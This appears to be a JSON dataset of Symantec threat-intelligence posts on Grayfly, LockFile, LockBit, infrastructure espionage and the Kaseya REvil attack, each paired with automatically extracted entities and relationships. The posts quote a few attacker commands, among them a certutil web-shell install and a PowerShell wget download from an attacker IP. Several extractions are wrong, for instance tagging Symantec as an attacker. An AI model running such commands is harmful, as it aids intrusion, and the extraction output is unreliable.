      "raw_output": "Named Entities: (iOS 14.8, Version), (FORCEDENTRY, Vulnerability), (NSO Group, Attacker), (Pegasus, Malware), (Citizen Lab, Organization), (Amnesty International, Organization), (Symantec, Organization), (Broadcom Software, Organization), (iMessage, Tool), (Apple ID, Credential), (zero-click attack, Technique), (NSO Group, Attacker)\nRelationships: (iOS 14.8, deployedIn, FORCEDENTRY), (FORCEDENTRY, affects, every mobile iOS device), (FORCEDENTRY, exploitedBy, Pegasus), (Pegasus, developedBy, NSO Group), (Pegasus, sellsTo, nation-states and law enforcement), (Pegasus, sellsTo, maintain public safety)",
      "entities": [
        [
          "iOS 14.8",
          "Version"
        ],
        [
          "FORCEDENTRY",
          "Vulnerability"
        ],
        [
          "NSO Group",
          "Attacker"
        ],
        [
          "Pegasus",
          "Malware"
        ],
        [
          "Citizen Lab",
          "Organization"
        ],
        [
          "Amnesty International",
          "Organization"
        ],
        [
          "Symantec",
          "Organization"
        ],
        [
          "Broadcom Software",
          "Organization"
        ],
        [
          "iMessage",
          "Tool"
        ],
        [
          "Apple ID",
          "Credential"
        ],
        [
          "zero-click attack",
          "Technique"
        ],
        [
          "NSO Group",
          "Attacker"
        ]
      ],
      "relationships": [
        [
          "iOS 14.8",
          "deployedIn",
          "FORCEDENTRY"
        ],
        [
          "FORCEDENTRY",
          "affects",
          "every mobile iOS device"
        ],
        [
          "FORCEDENTRY",
          "exploitedBy",
          "Pegasus"
        ],
        [
          "Pegasus",
          "developedBy",
          "NSO Group"
        ],
        [
          "Pegasus",
          "sellsTo",
          "nation-states and law enforcement"
        ],
        [
          "Pegasus",
          "sellsTo",
          "maintain public safety"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 6
  },
  {
    "title": "grayfly china sidewalk malware",
    "link": "https://www.security.com/threat-intelligence/grayfly-china-sidewalk-malware",
    "content": "Symantec, part ofBroadcom Software, has linked the recently discovered Sidewalk backdoor to the China-linked Grayfly espionage group. The malware, which is related to the older Crosswalk backdoor (Backdoor.Motnug) has been deployed in recent Grayfly campaigns against a number of organizations in Taiwan, Vietnam, the United States, and Mexico. A feature of this recent campaign was that a large number of targets were in the telecoms sector. The group also attacked organizations in the IT, media, and finance sectors. Sidewalk was recently documented by ESET, who attributed it to a new group it called SparklingGoblin, which it linked to the Winnti malware family. Symantec’s Threat Hunter Team has attributed Sidewalk to Grayfly, a longstanding Chinese espionage operation. Members of the groupwere indicted in the U.S. in 2020. The recent campaign involving Sidewalk suggests that Grayfly has been undeterred by the publicity surrounding the indictments. Grayfly (aka GREF and Wicked Panda) is a targeted attack group that has been active since at least March 2017 using a custom backdoor known as Backdoor.Motnug (aka TOMMYGUN/CROSSWALK), a custom loader called Trojan.Chattak, Cobalt Strike (aka Trojan.Agentemis), and ancillary tools in its attacks. Grayfly has been observed targeting a number of countries in Asia, Europe, and North America across a variety of industries, including food, financial, healthcare, hospitality, manufacturing, and telecommunications. In more recent activity, Grayfly has continued with its focus on telecommunications but has also been observed targeting organizations operating within the media, finance, and IT service provider sectors. Typically Grayfly targets publicly facing web servers to install web shells for initial intrusion, before spreading further within the network. Once a network has been compromised, Grayfly may install its custom backdoors onto additional systems. These tools allow the attackers to have comprehensive remote access to the network and proxy connections allowing them to access hard-to-reach segments of a target's network. Although sometimes labeled APT41, we consider Grayfly the espionage arm of APT41. Similarly, Symantec tracks other sub-groups of APT41 separately, such as Blackfly, its cyber-crime arm. A characteristic of the recent campaign was that the group appeared to be particularly interested in attacking exposed Microsoft Exchange or MySQL servers. This suggests that the initial vector may be the exploit of multiple vulnerabilities against public-facing servers. In at least one attack, the suspicious Exchange activity was followed by PowerShell commands used to install an unidentified web shell. Following this, the malicious backdoor was executed. After the installation of the backdoor, the attackers deployed a custom version of the credential-dumping tool Mimikatz. This version of Mimikatz has been used previously in Grayfly attacks. The first indication of attacker activity was identified at 20:39 local time, where a Base64-encoded PowerShell command was executed via a legitimate Exchange Server-related process. The command was used to execute certutil to decode and install a web shell: >(^_certutil -decode -f C:\\Windows\\Temp\\ImportContactList_-.aspx C:\\Windows\\Temp\\ImportContactList.aspx;if((dir C:\\Windows\\Temp\\ImportContactList.aspx).Length -eq 212){Remove-Item -Force C:\\Windows\\Temp\\ImportContactList_*-*.aspx}* Next, another Base64-encoded PowerShell command was executed. This command was used to move the web shell to the Exchange install path, accessible by the attackers – specifically the ClientAccess\\ecp directory. Several minutes later, a backdoor was executed via installutil.exe: Roughly an hour later, the attackers were observed executing a WMIC command in order to run a Windows batch file. This file was used to create a scheduled task to execute the backdoor and ensure persistence: Shortly after this, Mimikatz was executed to dump credentials: After this point, no further activity was observed. Three Chinese men were indicted in the U.S. in 2020 for their involvement in attacks that involved Grayfly tools and tactics. At the time of the indictment, Jiang Lizhi, Qian Chuan, and Fu Qiang were based in the Chinese city of Chengdu and held senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with other security operations. The indictment charged the men with involvement in attacks against over 100 different organizations in the U.S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection. Grayfly is a capable actor, likely to continue to pose a risk to organizations in Asia and Europe across a variety of industries, including telecommunications, finance, and media. It's likely this group will continue to develop and improve its custom tools to enhance evasion tactics along with using commodity tools such as publicly available exploits and web shells to assist in their attacks. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Broadcom Software, Company), (Grayfly, Attacker), (Sidewalk, Malware), (Crosswalk, Malware), (Backdoor.Motnug, Malware), (ESET, Company), (SparklingGoblin, Attacker), (Winnti, Malware Family), (Grayfly, Attacker), (TommyGun/CrossWalk, Malware), (Trojan.Chattak, Malware), (CobaltStrike, Tool), (GREF, Attacker), (WickedPanda, Attacker), (China, Country), (Taiwan, Country), (Vietnam, Country), (UnitedStates, Country), (Mexico, Country), (IT, Industry), (media, Industry), (finance, Industry), (food, Industry), (healthcare, Industry), (hospitality, Industry), (manufacturing, Industry), (telecommunications, Industry)\nRelationships: (Symantec, links, Grayfly), (Symantec, attributes, Sidewalk), (Symantec, uses, Grayfly), (Symantec, attributes, ESET), (Symantec, attributes, SparklingGoblin), (Symantec, attributes, Winnti), (Symantec, attributes, Tommynu/Crosswalk), (Symantec, attributes, Tommygun/Crosswalk), (Symantec, attributes,",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom Software",
          "Company"
        ],
        [
          "Grayfly",
          "Attacker"
        ],
        [
          "Sidewalk",
          "Malware"
        ],
        [
          "Crosswalk",
          "Malware"
        ],
        [
          "Backdoor.Motnug",
          "Malware"
        ],
        [
          "ESET",
          "Company"
        ],
        [
          "SparklingGoblin",
          "Attacker"
        ],
        [
          "Winnti",
          "Malware Family"
        ],
        [
          "Grayfly",
          "Attacker"
        ],
        [
          "TommyGun/CrossWalk",
          "Malware"
        ],
        [
          "Trojan.Chattak",
          "Malware"
        ],
        [
          "CobaltStrike",
          "Tool"
        ],
        [
          "GREF",
          "Attacker"
        ],
        [
          "WickedPanda",
          "Attacker"
        ],
        [
          "China",
          "Country"
        ],
        [
          "Taiwan",
          "Country"
        ],
        [
          "Vietnam",
          "Country"
        ],
        [
          "UnitedStates",
          "Country"
        ],
        [
          "Mexico",
          "Country"
        ],
        [
          "IT",
          "Industry"
        ],
        [
          "media",
          "Industry"
        ],
        [
          "finance",
          "Industry"
        ],
        [
          "food",
          "Industry"
        ],
        [
          "healthcare",
          "Industry"
        ],
        [
          "hospitality",
          "Industry"
        ],
        [
          "manufacturing",
          "Industry"
        ],
        [
          "telecommunications",
          "Industry"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "links",
          "Grayfly"
        ],
        [
          "Symantec",
          "attributes",
          "Sidewalk"
        ],
        [
          "Symantec",
          "uses",
          "Grayfly"
        ],
        [
          "Symantec",
          "attributes",
          "ESET"
        ],
        [
          "Symantec",
          "attributes",
          "SparklingGoblin"
        ],
        [
          "Symantec",
          "attributes",
          "Winnti"
        ],
        [
          "Symantec",
          "attributes",
          "Tommynu/Crosswalk"
        ],
        [
          "Symantec",
          "attributes",
          "Tommygun/Crosswalk"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 28,
    "relationship_count": 8
  },
  {
    "title": "lockfile ransomware new petitpotam windows",
    "link": "https://www.security.com/threat-intelligence/lockfile-ransomware-new-petitpotam-windows",
    "content": "UPDATE August 23: Third parties have identified a ProxyShell exploit as a potential vector for the PowerShell-related commands that are identified in this blog.Researcher Kevin Beaumontfirst spotted that ProxyShell was being exploited from 209.14.0[.]234 on August 13. The ProxyShell and LockFile link is also mentionedin this Twitter thread. Protection information has been updated below based on this new information. What appears to be a new ransomware family is being used to target victims in various industries around the globe. The LockFile ransomware was first observed on the network of a U.S. financial organization on July 20, 2021, with its latest activity seen as recently as August 20. LockFile has been seen on organizations around the world, with most of its victims based in the U.S. and Asia. Indications are that the attackers gain access to victims' networks via Microsoft Exchange Servers, and then usethe incompletely patched PetitPotam vulnerabilityto gain access to the domain controller, and then spread across the network. It is not clear how the attackers gain initial access to the Microsoft Exchange Servers. Victims are in the manufacturing, financial services, engineering, legal, business services, and travel and tourism sectors. The attackers behind this ransomware use a ransom note with a similar design to that used by the LockBit ransomware gang (Figure 1)and reference the Conti gang in the email address they use - contact@contipauper[.]com. Exchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command such as the following: powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH Otherpowershell wgetcommands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is downloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before beginning the ransomware attack. Typically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server. Included in these tools is: The active_desktop_launcher.exe is a legitimate version of KuGou Active Desktop. The executable is being used in a DLL search order loading attack to load a malicious active_desktop_render.dll file. This active_desktop_render.dll file, when loaded by the active_desktop_launcher.exe, attempts to load and decrypt a file in the local directory called “desktop.ini”. If the file is successfully loaded and decrypted, shellcode from the file is executed. As the investigation into these attacks is ongoing, a copy of “desktop.ini” has yet to be retrieved for analysis. The encrypted shellcode, however, very likely activates the efspotato.exe file that exploits PetitPotam. This is an NTLM relay attack bug that can be used by a low-privileged attacker to take over a domain controller. It was patched inMicrosoft’s August Patch Tuesdayrelease, but it subsequently emerged that the fix released reportedly did not fully patch the vulnerability. Once access has been gained to the local domain controller, the attackers copy over the LockFile ransomware, along with a batch file and supporting executables, onto the domain controller. These files are copied into the “sysvol\\domain\\scripts” directory. This directory is used to deploy scripts to network clients when they authenticate to the domain controller. This means that any clients that authenticate to the domain after these files have been copied over will execute them. The files that are copied into the Sysvol directory are: The Autoupdate.exe file is a variant of the LockFile payload, which is unique to each organization targeted. The Autologin.exe, Autlogin.dll, and Autologin.sys files are all part of a toolkit called the Kernel Driver Utility (KDU -https://github.com/hfiref0x/KDU). Autologin.dll is the “Tanikaze.dll” component, and the autologin.exe is the “Hamakaze” component. It is currently unclear exactly how the KDU tool is utilized by the attacker in conjunction with the ransomware. Regardless of how they are utilized, the LockFile ransomware is ultimately executed. LockFile appears to be a new threat on the already crowded ransomware landscape. The investigation into this threat, and whether it may have links to any previously seen or retired ransomware threats continues. This is an ongoing investigation and Symantec, part ofBroadcom Software, may update this blog with new information if it comes to light. The following protections are in place to protect customers against LockFile attacks: For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec Data Center Security default hardening policies for Microsoft Exchange servers and Windows Domain Controllers protect against ProxyShell vulnerabilities and prevent LockFile ransomware attacks on Domain Controllers. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ProxyShell, Malware), (LockFile, Malware), (LockBit, Threat Type), (Conti, Attacker), (Microsoft Exchange Server, Vulnerability), (contact@contipauper[.]com, Email Address)\\nRelationships: (ProxyShell, uses, LockFile), (LockFile, referencedBy, LockBit), (LockBit, referencedBy, Conti), (Microsoft Exchange Server, contains, PetitPotam vulnerability), (contact@contipauper[.]com, associatedWith, Conti)",
      "entities": [
        [
          "ProxyShell",
          "Malware"
        ],
        [
          "LockFile",
          "Malware"
        ],
        [
          "LockBit",
          "Threat Type"
        ],
        [
          "Conti",
          "Attacker"
        ],
        [
          "Microsoft Exchange Server",
          "Vulnerability"
        ],
        [
          "contact@contipauper[.]com",
          "Email Address"
        ],
        [
          "ProxyShell",
          "uses",
          "LockFile"
        ],
        [
          "LockFile",
          "referencedBy",
          "LockBit"
        ],
        [
          "LockBit",
          "referencedBy",
          "Conti"
        ],
        [
          "Microsoft Exchange Server",
          "contains",
          "PetitPotam vulnerability"
        ],
        [
          "contact@contipauper[.]com",
          "associatedWith",
          "Conti"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 0
  },
  {
    "title": "ransomware trends lockbit sodinokibi",
    "link": "https://www.security.com/threat-intelligence/ransomware-trends-lockbit-sodinokibi",
    "content": "The shutdown of the Leafroller ransomware gang (aka Sodinokibi/REvil) has resulted in a surge in LockBit activity, as some ex-Sodinokibi affiliates move to that ransomware. Meanwhile, there is also more evidence that some attackers are affiliated to more than one ransomware group and are switching between ransomware families mid-attack if the initial ransomware they attempt to deploy fails to execute. These are just the latest developments Symantec, part ofBroadcom Software, has seen as ransomware actors continue to evolve their tactics to make their attacks more dangerous and effective. Attacks involving the LockBit ransomware have increased markedly over the past month, with some indications that the group behind it is attempting to fill the gap left by the Sodinokibi ransomware. Sodinokibi’sinfrastructure and websites disappeared on July 12, 2021, shortly after the group had carried out a major ransomware attack in which it encrypted approximately 60 managed service providers (MSPs) and more than 1,500 individual businesses usinga zero-day vulnerability in the Kaseya VSA remote management software. It’s unclear why exactly the gang’s operations shut down, but it has been speculated that the gang shuttered their activity following either pressure or action by law enforcement. Symantec researchers have seen evidence that at least one former Sodinokibi affiliate is now using LockBit. Symantec has observed an attacker using consistent tactics, tools, and procedures (TTPs) attempting to deliver Sodinokibi to victims until July of 2021, when the payload switched to LockBit. LockBit (aka Syrphid) was first seen in September 2019, and launched its ransomware-as-a-service (RaaS) offering in January 2020, however, there was a marked increase in its activity in the last month as it seemingly attempted to recruit former Sodinokibi affiliates. This recent attack began with a file named mimi.exe, which is an installer that drops a number of password-dumping tools. Immediately prior to the ransomware being launched, a large number of commands were executed to disable various services, block access to remote desktop protocol (RDP), and delete shadow copies. This is activity we typically see before ransomware is deployed on a system. The actor behind this attack consistently named their ransomware payload as svhost.exe and this practice was maintained following their transition to LockBit. The actors behind recent LockBit campaigns were seen using a variety of different TTPs before deploying the ransomware payload, including: The numerous password-dumping tools used by these attackers indicates that harvesting credentials is a key part of their attack chain. In another ransomware attack that occurred in June 2021, it appears that attackers who usually encrypt networks using the Conti ransomware switched payloads and used the Sodinokibi ransomware instead. Initial activity in this attack followed the attackers’ usual playbook, deploying Cobalt Strike, an off-the-shelf remote access tool commonly seen used in ransomware attacks. This would usually be followed by them delivering Conti. Conti first appeared in December 2019 and has been seen used in some high-profile recent ransomware attacks, many targeting healthcare providers, including a May 2021 ransomware attackthat crippled Ireland’s public health service provider, the HSE. However, in this recent attack, instead of deploying Conti, the attackers switched payloads and deployed Sodinokibi to encrypt several hundred machines on the network. Before Sodinokibi was deployed we saw the attackers use BitsAdmin when moving across the victim network, while they also carried out some other preliminary activity before deploying the ransomware, including disabling Microsoft Defender, disabling RealTime Monitoring, and deleting shadow copies. The attackers maintained a presence on the victim network for approximately three weeks before the Sodinokibi ransomware was deployed. While not common up to now, this isn’t the first time we have seen evidence of affiliates appearing to have access to more than one ransomware family at the same time. In the attack we talked about in our blogRansomware: Growing Number of Attackers Using Virtual Machines,there was evidence the attacker had access to both the Mount Locker and Conti ransomware, and may have attempted to run one payload on a virtual machine and, when that didn’t work, ran Mount Locker on the host computer instead. Affiliates switching between different ransomware families like this is yet another attempt by ransomware actors to increase the chances of their attacks succeeding, and it will be interesting to see whether or not this is a tactic we start to increasingly observe during ransomware attacks. Having access to multiple ransomware families increases the likelihood of affiliates being able to encrypt machines, increasing the dangers posed by these already dangerous attacks. This is just the latest development we have seen from ransomware actors, who are constantly refining their tactics in order to maximise their profits. The use of virtual machines was another example of attackers tweaking their approach in order to carry out a ransomware attack, while the emergence of double-extortion ransomware attacks last year, where attackers steal data and threaten to release it while also encrypting machines in ransomware attacks, led to one of the biggest shifts we saw in the ransomware landscape in recent times. The surge in LockBit activity that we have seen also shows that while some big ransomware names have shut down their operations in recent times, there are many other ransomware operators waiting to fill the space that has been left. Ransomware actors continue to change and refine their tactics in an effort to evade the security steps taken by organizations to stop these types of attacks, which is why ransomware remains one of the biggest threats on the cyber crime landscape in 2021. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Leafroller ransomware gang, Malware), (Sodinokibi/REvil, Malware), (LockBit, Malware), (ex-Sodinokibi affiliates, Attacker), (LockBit ransomware, Malware), (LockBit, Threat Type), (LockBit ransomware, deployed, Zero-day vulnerability in the Kaseya VSA remote management software), (LockBit ransomware, attempted, Fill the gap left by the Sodinokibi ransomware), (Symantec, Attacker), (Broadcom Software, Attacker), (LockBit ransomware, attacked, Managed Service Providers (MSPs)), (LockBit ransomware, attacked, Individual businesses), (Zero-day vulnerability in the Kaseya VSA remote management software, Vulnerability), (Kaseya VSA remote management software, Tool), (LockBit ransomware, evolved, Tactics), (LockBit ransomware, evolved, TTPs), (LockBit ransomware, evolved, Ransomware families), (LockBit ransomware, evolved, Initial ransomware deployment), (LockBit ransomware, evolved, More dangerous and effective)\nRelationships: (Leafroller ransomware gang, uses, Sodinokibi/REvil), (Sodinokibi/REvil, uses, LockBit), (ex-Sodinokibi affiliates, usedBy, LockBit), (LockBit ransomware, launched, Zero-day",
      "entities": [
        [
          "Leafroller ransomware gang",
          "Malware"
        ],
        [
          "Sodinokibi/REvil",
          "Malware"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "ex-Sodinokibi affiliates",
          "Attacker"
        ],
        [
          "LockBit ransomware",
          "Malware"
        ],
        [
          "LockBit",
          "Threat Type"
        ],
        [
          "LockBit ransomware",
          "deployed",
          "Zero-day vulnerability in the Kaseya VSA remote management software"
        ],
        [
          "LockBit ransomware",
          "attempted",
          "Fill the gap left by the Sodinokibi ransomware"
        ],
        [
          "Symantec",
          "Attacker"
        ],
        [
          "Broadcom Software",
          "Attacker"
        ],
        [
          "LockBit ransomware",
          "attacked",
          "Managed Service Providers (MSPs"
        ],
        [
          "LockBit ransomware",
          "attacked",
          "Individual businesses"
        ],
        [
          "Zero-day vulnerability in the Kaseya VSA remote management software",
          "Vulnerability"
        ],
        [
          "Kaseya VSA remote management software",
          "Tool"
        ],
        [
          "LockBit ransomware",
          "evolved",
          "Tactics"
        ],
        [
          "LockBit ransomware",
          "evolved",
          "TTPs"
        ],
        [
          "LockBit ransomware",
          "evolved",
          "Ransomware families"
        ],
        [
          "LockBit ransomware",
          "evolved",
          "Initial ransomware deployment"
        ],
        [
          "LockBit ransomware",
          "evolved",
          "More dangerous and effective"
        ]
      ],
      "relationships": [
        [
          "Leafroller ransomware gang",
          "uses",
          "Sodinokibi/REvil"
        ],
        [
          "Sodinokibi/REvil",
          "uses",
          "LockBit"
        ],
        [
          "ex-Sodinokibi affiliates",
          "usedBy",
          "LockBit"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 19,
    "relationship_count": 3
  },
  {
    "title": "critical infrastructure south east asia espionage",
    "link": "https://www.security.com/threat-intelligence/critical-infrastructure-south-east-asia-espionage",
    "content": "Four critical infrastructure organizations in a South East Asian country were targeted in an intelligence-gathering campaign that continued for several months.  (Read the whitepaperhere.) Among the organizations targeted were a water company, a power company, a communications company, and a defense organization, with evidence the attackers were interested in information about SCADA systems. The attacks were ongoing from at least November 2020 to March 2021, several months before the Colonial Pipeline attack that drew the attention of the world to the danger posed by attacks on critical infrastructure, and may have begun even earlier than that. An attacker gaining access to multiple critical infrastructure organizations in the same country could potentially give malicious actors access to a vast amount of sensitive information. There are numerous indications that the same attacker was behind all the attacks, including: There are some indications that the attacker behind this campaign is based in China, but with the current information available, Symantec cannot attribute the activity to a known actor. Credential theft and lateral movement across victim networks seemed to be a key aim of the attacker, who made extensive use of living-off-the-land tools in this campaign. Among the living-off-the-land or dual-use tools used were: The attacker was also seen exploiting a legitimate multimedia player to load a malicious DLL via search order hijacking, as well as exploiting another legitimate tool to load suspicious files onto victim machines. We did not see what the initial infection vector used by the attacker to get onto targeted networks was, but we did have good insight into how they moved through infected networks. The first activity we saw in the attack on this organization was suspicious use of WMI. We then saw a legitimate free multimedia player called PotPlayer Mini being exploited to load a malicious DLL. Ithas previously been publicly documentedthat this player is susceptible to DLL search order hijacking, which is not a new technique but is one we see frequently leveraged by attackers to insert malicious files onto victim machines. We saw PotPlayer Mini added as a service to launch a file called potplayermini.exe, we then saw multiple dual-use and hacking tools launched, including: ProcDump was used for credential theft by abusing the LSASS.exe process, and domain shares were enumerated using net view. We then observed a suspected tunneling tool being launched on the system. We did not observe the attackers exfiltrating data from the infected machines. However, the machine the attackers were on did have tools on it that indicate it may have been involved in the design of SCADA systems, indicating this is something the attacker may have been interested in. PotPlayer Mini was also exploited on the power company network to carry out DLL search order hijacking, and ProcDump was deployed alongside another payload that we suspect was malware. We also saw the attacker once again carrying out credential theft by using ProcDump of the LSASS.exe process. There were indications that the infected machine in this company may also have been involved in engineering design. File overlap, as well as the similar tactics used, point to the same actor being behind the attacks on the water and power companies. Meanwhile, in the attack on the communications company the attacker exploited a different legitimate tool, Google Chrome Frame, with suspicious files appearing where chrome_frame_helper.exe was the parent file. Google Chrome Frame is a legitimate plugin for Internet Explorer that enables rendering of the full browser canvas using Google Chrome's rendering engine. It wasn’t clear if Google Chrome Frame was already present on the infected machine in this company or if it was introduced by the attacker, as it was the parent file of legitimate as well as suspicious files. PotPlayer Mini also appeared to be exploited on this machine by the attacker for malicious purposes. PAExec, a tool similar to PsExec, launched at.exe (a Windows task scheduler), in order to schedule execution of chrome_frame_helper.exe as a task. WMI was used to run chrome_frame_helper.exe and perform credential theft by dumping LSASS. PAExec and WMIC were also used for lateral movement and to launch chrome_frame_helper.exe against an internal IP address. PAExec also launched it to schedule execution of an unknown batch file as a daily task, and chrome_frame_helper.exe was also used to launch the SharpHound domain trust enumeration tool and other suspicious files. PAExec was also seen executing what appeared to be Mimikatz for suspected credential theft. WMI was also used to run chrome_frame_helper.exe to execute a net.exe command to connect a hidden C$ share. C$ shares are administrator shares that are not visible when viewing another computer's shares, but are accessible to those with administrator privileges on a machine. These types of shares are frequently used by malicious actors to stealthily transfer malware across a network and to collect stolen data. However, it is not clear what the C$ share was used for on this network. We also saw persistence created for chrome_frame_helper.exe as a scheduled task - GoogleUpdateTaskMachineCore4f23 - with the file disguised as chrome_proxy1.exe. A keylogger and several other files seen on the network of this organization were also seen on the network of the water company. In the defense organization we once again saw PotPlayer Mini exploited for DLL search order hijacking, as well as seeing some file overlaps between this organization and the communications and water companies. While we cannot definitively say what the end goal of the attacker was in these attacks, espionage seems like the likeliest motive. This is indicated by the activity we did see - credential stealing, lateral movement, keyloggers being deployed - and the types of machines targeted in some of the organizations - those involved in design and engineering. The ability of the attacker to maintain a stealthy presence on the targeted networks for a number of months indicates they were skilled. Certain artifacts found on the victim machines indicate the attacker may be based in China, though it is not possible with the information we have to definitively attribute these attacks to a named actor. A skilled malicious actor from a different country gaining a deep insight into a country’s critical infrastructure by compromising multiple critical infrastructure organizations, including a defense organization, could deliver a lot of valuable intelligence into the hands of adversaries. The Colonial Pipeline attack in the U.S. in May 2021 showed the serious repercussions attacks on critical infrastructure can have, and this campaign makes it clear that it is not just U.S. infrastructure that is under threat from malicious actors. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (water company, Organization), (power company, Organization), (communications company, Organization), (defense organization, Organization), (Colonial Pipeline, Organization), (SCADA system, Technology), (living-off-the-land, Technique), (China, Country), (Symantec, Company), (Credential theft, Technique), (lateral movement, Technique), (living-off-the-land, Technique), (search order hijacking, Technique), (multimedia player, Tool), (DLL, File)\nRelationships: (water company, targets, critical infrastructure), (power company, targets, critical infrastructure), (communications company, targets, critical infrastructure), (defense organization, targets, critical infrastructure), (Colonial Pipeline, targets, critical infrastructure), (SCADA system, targets, critical infrastructure), (living-off-the-land, usedBy, attacker), (living-off-the-land, usedBy, credential theft), (living-off-the-land, usedBy, lateral movement), (living-off-the-land, usedBy, search order hijacking), (living-off-the-land, usedBy, multimedia player), (living-off-the-land, usedBy, DLL)",
      "entities": [
        [
          "water company",
          "Organization"
        ],
        [
          "power company",
          "Organization"
        ],
        [
          "communications company",
          "Organization"
        ],
        [
          "defense organization",
          "Organization"
        ],
        [
          "Colonial Pipeline",
          "Organization"
        ],
        [
          "SCADA system",
          "Technology"
        ],
        [
          "living-off-the-land",
          "Technique"
        ],
        [
          "China",
          "Country"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "Credential theft",
          "Technique"
        ],
        [
          "lateral movement",
          "Technique"
        ],
        [
          "living-off-the-land",
          "Technique"
        ],
        [
          "search order hijacking",
          "Technique"
        ],
        [
          "multimedia player",
          "Tool"
        ],
        [
          "DLL",
          "File"
        ]
      ],
      "relationships": [
        [
          "water company",
          "targets",
          "critical infrastructure"
        ],
        [
          "power company",
          "targets",
          "critical infrastructure"
        ],
        [
          "communications company",
          "targets",
          "critical infrastructure"
        ],
        [
          "defense organization",
          "targets",
          "critical infrastructure"
        ],
        [
          "Colonial Pipeline",
          "targets",
          "critical infrastructure"
        ],
        [
          "SCADA system",
          "targets",
          "critical infrastructure"
        ],
        [
          "living-off-the-land",
          "usedBy",
          "attacker"
        ],
        [
          "living-off-the-land",
          "usedBy",
          "credential theft"
        ],
        [
          "living-off-the-land",
          "usedBy",
          "lateral movement"
        ],
        [
          "living-off-the-land",
          "usedBy",
          "search order hijacking"
        ],
        [
          "living-off-the-land",
          "usedBy",
          "multimedia player"
        ],
        [
          "living-off-the-land",
          "usedBy",
          "DLL"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 12
  },
  {
    "title": "kaseya ransomware supply chain",
    "link": "https://www.security.com/threat-intelligence/kaseya-ransomware-supply-chain",
    "content": "UPDATE July 5 2021:Our blog has been updated with more details on how the ransomware was executed along with additional protection information. Several hundred organizations have been targeted by the REvil (aka Sodinokibi) ransomware in a supply chain attack involving Kaseya VSA software and multiple Managed Service Providers (MSPs) who use it. News of the attack broke yesterday (Friday 3 July), prompting Kaseya to urge VSAusers to shut down their VSA serversto prevent them from being compromised. The attack may have been timed to coincide with the 4th of July holiday weekend in the U.S., where many organizations may be lightly staffed. Are Symantec customers protected? Yes, Symantec Endpoint products proactively blocked tools used to deliver the ransomware payload in this wave of attacks. How many organizations are affected? According to Kaseya only a very small percentage of their customers were affected, “currently estimated at fewer than 40 worldwide”. However, each of those organizations may be MSPs with multiple customers. Current reports suggest hundreds of victims. How was REvil delivered to computers during these attacks? While the exploit used to breach Kaseya VSA server side has not yet been fully documented, it is known that the attackers delivered a malicious script and an ASCII PEM named agent.crt to Kaseya VSA clients. The dropper masqueraded inside the ASCII PEM file, which was decoded using certutil after attempts to disable Microsoft Defender. It dropped two resources, an old, but legitimate copy of Windows Defender (MsMpEng.exe) and custom malicious loader. The dropper writes the two files to disk and executes MsMpEng.exe which then side loads and executes the custom loader's export (mpsvc.dll). What was the motivation for the attacks? REvil attacks are usually financially motivated. However, there are some signs that the attacks may be politically motivated disruption. The attackers have, on occasion, appeared to have a political motive in their selection of targets. In this attack, strings in the payload made references to President Joe Biden, ex-president Donald Trump, and Black Lives Matter. The attackers demanded a ransom of $45,000, which may be another reference to Trump, who was the 45th president of the U.S. Furthermore, REvil’s Tor payment site is down at the time of writing, meaning victims will have no way of paying a ransom. Whether the group is having technical difficulties or whether it never intended to collect a ransom remains unclear. What is REvil/Sodinokibi? REvil (detected as Ransom.Sodinokibi) is a family of ransomware developed by a cybercrime group Symantec calls Leafroller. The ransomware is used in targeted attacks, where the attackers attempt to encrypt all computers on the victim’s network in the hope of extorting a large ransom. The group is known to steal victim data prior to encryption and threaten to release it unless a ransom is paid. Leafroller is one of the most established and prolific targeted ransomware groups in operation. Prior to its development of REvil, the group was associated with an older ransomware family known as Gandcrab. Leafroller is known to operate a Ransomware-as-a- Service, where its sells its tools to collaborators known as affiliates in exchange for a cut of any ransom payments they obtain. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products. File-based protection: Network-based protection: For the latest protection updates, please visit theSymantec Protection Bulletin. d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e - Dropper df2d6ef0450660aaae62c429610b964949812df2da1c57646fc29aa51c3f031e - Dropper 